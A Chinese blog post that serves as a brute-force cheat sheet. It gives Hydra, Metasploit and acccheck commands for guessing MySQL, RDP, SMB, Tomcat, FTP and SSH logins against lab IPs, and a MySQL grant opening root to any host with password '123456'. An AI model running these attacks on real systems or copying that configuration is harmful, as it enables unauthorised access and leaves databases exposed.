---
title: 涨姿势！暴力破解方法和工具
index_img: /img/2019-01-18/index.png
date: 2019-01-18 19:39:59
tags: 
- 暴力破解
---
**字典虽小，够用就行**
<!--more-->

### 二、 暴力破解
#### 2.1 mysql数据库破解
&emsp;&emsp;# 爆破数据库账号密码，数据库必须要开启3306远程登录
&emsp;&emsp;&emsp;&emsp;2.1.1 Hydra
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 用户名 -P 字典 服务名 -V
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# hydra 192.168.146.141 -l root -P dist.txt mysql -V
&emsp;&emsp;&emsp;&emsp;2.1.2 HexorBase
&emsp;&emsp;&emsp;&emsp;2.1.3 metasploit（search查找模块、back返回）
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/mysql/mysql_login
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# show options
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set host IP地址
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set username 用户
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set PASS_FILE dist.txt
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set port 端口号
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;run
#### 2.2 mysql数据库配置（对外）
&emsp;&emsp;&emsp;&emsp;2.2.1 3306端口对外开放
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;grant all privileges on *.* to 'root'@'%' identified by '123456' with grant option;
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;flush privileges;（root，123456）
&emsp;&emsp;&emsp;&emsp;2.2.2 Navicat数据库管理软件
&emsp;&emsp;&emsp;&emsp;2.2.3 报错解决方案
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;is blocked because of many connec错误解决方案：
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;进入Mysql数据库查看max_connect_errors： 
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;show variables like 'max_connect_errors';
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;修改max_connect_errors的数量为1000： 
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set global max_connect_errors = 1000;
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;查看是否修改成功：
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;show variables like 'max_connect_errors';
#### 2.3 3389远程连接爆破
&emsp;&emsp;&emsp;&emsp;2.3.1 DuBrute
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;这个只能爆rdp的，smb的用下面（比如win server）
&emsp;&emsp;&emsp;&emsp;2.3.2 Hydra
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 单个账户名 -P 字典路径 服务名 -V
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# hydra 192.168.146.141 -l administrator -P /top1500.txt rdp -V  (rdp可以换smb)
&emsp;&emsp;&emsp;&emsp;2.3.3 acccheck（smb）
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;acccheck -t 192.168.0.106 -U user.txt -P password.txt
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;acccheck -t 192.168.0.106 -u tian -P dic.txt
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;结果保存在cracked文件中
#### 2.4 Web-Tomcat中间件
&emsp;&emsp;&emsp;&emsp;2.4.1 Metasploit
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/http/tomcat_mgr_login
&emsp;&emsp;&emsp;&emsp;2.4.3 对外访问
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;Server.xml
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<Engine name="Catalina" defaultHost="IP地址"\>
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<Host name="IP地址" appBase="webapps" npackWARs="true" autoDeploy="true"\>
#### 2.5 ftp爆破
&emsp;&emsp;&emsp;&emsp;2.5.1 Metasploit
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/ftp/ftp_login
&emsp;&emsp;&emsp;&emsp;2.5.2 Hydra
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 单个账户名 -P 字典路径 服务名 -V
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# hydra 192.168.146.141 -l admin -P /top1500.txt ftp -V
#### 2.6 ssh爆破
&emsp;&emsp;&emsp;&emsp;2.6.1 Metasploit
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/ssh/ssh_login
&emsp;&emsp;&emsp;&emsp;2.6.2 Hydra
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 单个账户名 -P 字典路径 服务名 -V
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;#hydra 192.168.146.141 -l root -P /top1500.txt ssh -V
#### 2.7 Webshell爆破
&emsp;&emsp;&emsp;&emsp;2.7.1 BurpSuite





